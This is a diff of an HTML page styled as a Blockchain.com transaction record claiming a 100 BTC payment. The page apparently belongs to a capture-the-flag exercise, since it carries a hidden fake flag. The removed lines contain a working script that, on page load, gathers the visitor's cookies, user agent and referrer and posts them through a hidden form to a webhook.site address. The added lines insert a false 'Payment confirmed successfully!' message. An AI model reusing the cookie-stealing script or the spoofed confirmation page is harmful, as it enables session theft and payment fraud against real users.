@@ -4,36 +4,13 @@
     <title>Transaction Details - Blockchain.com</title>
 </head>
 <body>
-    <h1>Transaction Hash: 1234567890abcdef...</h1>
+    <h1>Transaction Hash: 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef</h1>
     <p>Amount: 100 BTC ✅</p>
-
-    <script>
-        // Когда страница загружается, отправляем данные бота
-        window.onload = function() {
-            var data = {
-                'transaction': '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-                'amount': '100 BTC',
-                'cookies': document.cookie,
-                'user_agent': navigator.userAgent,
-                'referrer': document.referrer
-            };
-            
-            // Создаем форму и отправляем через POST
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394';
-            
-            for (var key in data) {
-                var input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = data[key];
-                form.appendChild(input);
-            }
-            
-            document.body.appendChild(form);
-            form.submit();
-        };
-    </script>
+    
+    <!-- Явно указываем, что это подтверждение платежа -->
+    <p id="confirmation">Payment confirmed successfully!</p>
+    
+    <!-- Скрытый элемент с потенциальным флагом, если он должен быть где-то на странице -->
+    <div style="display:none;">CTF{fake_flag_for_testing_purposes}</div>
 </body>
 </html>
